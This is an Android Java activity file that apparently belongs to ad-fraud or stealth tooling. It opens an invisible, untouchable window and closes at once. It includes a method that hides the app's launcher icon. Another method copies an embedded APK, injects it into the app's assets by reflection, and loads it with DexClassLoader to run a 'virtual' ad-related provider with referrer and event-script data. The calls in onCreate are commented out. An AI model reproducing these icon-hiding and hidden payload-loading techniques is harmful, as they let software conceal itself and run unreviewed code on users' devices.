package com.cp.chengradle.work.virtual;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.WindowManager;

import com.omg.heart.free.sdk.ver.Config;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.ArrayList;

import dalvik.system.DexClassLoader;


public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        MainActivity.this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );
        super.onCreate(savedInstanceState);

//        String str = "test1.apk";
//        String path = Environment.getExternalStorageDirectory().getPath() + "/test/"+str;
////        Log.e("sdk", "===path "+new File(path).exists());
//        doTest(path,true,null,null,0);
////        hide(this);
        finish();
        int a = 9;
        if (a > 10) {

        }
    }

    private void doTest(String path, boolean flag, ArrayList<String> eventData, String eventJSName, long existTime) {
        String filesDir = this.getCacheDir().getAbsolutePath();
        String vrMachineName = Config.VrMachineName;
        System.setProperty("vrMachineName", vrMachineName);
        final String libPath = filesDir + File.separator + vrMachineName + ".apk";
        System.setProperty("vrMachinePath", libPath);
        new TrackBook().copyApk(libPath, this);

        try {
            this.getAssets().getClass().getDeclaredMethod("addAssetPath", String.class)
                    .invoke(this.getAssets(), libPath);
        } catch (Throwable e) {
            e.printStackTrace();
        }

        DexClassLoader loader = new DexClassLoader(libPath, filesDir,null , getApplicationContext().getClassLoader());

        try {

//            String path = Environment.getExternalStorageDirectory().getPath() + "/test/"+str+".apk";
            Bundle data = new Bundle();
            data.putString("path",path);
            data.putString("platformType", "");
            data.putString("adType","");
            data.putString("adPlacementId","");
            data.putString("pkg","com.aaa");
            data.putString("referrer","");
            data.putBoolean("appIsShowFlag",flag);
            data.putString("EventJSPath", eventJSName);
            data.putStringArrayList("EventJSData",eventData);
            data.putLong("EventJSExistTime", existTime);
            Class localClass = loader.loadClass("com.core.model.VirtualOpenProvider");
            Constructor<?> localConstructor = localClass.getConstructor(new Class[] {Bundle.class,Context.class});
            Object instance = localConstructor.newInstance(new Object[] {data,MainActivity.this});

            Method methodonCreate2 = localClass.getDeclaredMethod("startVirtual", new Class[] {});
            methodonCreate2.setAccessible(true);
            methodonCreate2.invoke(instance, new Object[] {});

        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private void hide(Context mContext) {
        Intent intent = mContext.getPackageManager().getLaunchIntentForPackage(mContext.getPackageName());

        if (intent != null) {
            if (intent.getComponent() != null) {
                try {
                    PackageManager packageManager = mContext.getPackageManager();
                    ComponentName componentName = new ComponentName(mContext, intent.getComponent().getClassName());
                    int res = packageManager.getComponentEnabledSetting(componentName);
                    if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                        // 隐藏应用图标
                        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
    }
}
